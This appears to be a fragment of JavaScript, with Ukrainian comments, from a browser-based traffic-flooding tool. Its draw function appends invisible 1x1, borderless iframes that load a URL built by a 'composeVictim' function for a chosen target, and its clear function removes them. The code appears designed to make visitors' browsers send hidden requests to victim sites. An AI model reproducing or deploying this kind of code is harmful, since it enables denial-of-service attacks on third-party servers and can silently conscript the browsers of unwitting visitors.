const Frames = {
	/**
	 * Створення об'єкту `<iframe>`
	 * @param {object} target  **Ціль**
	 */
	async draw(target) {
		$("<iframe>", {
			src: await composeVictim(target),
			method: 'GET',
			frameBorder: 0,
			width: 1,
			height: 1
		}).appendTo(frameDiv)
	},
	/**
	 * Видалення об'єктів `<iframe>`
	 */
	clear() {
		const a = frameDiv[0].children;
		while (frameDiv[0].children.length) {
			for (let i of a) i.remove()
		}
	}
}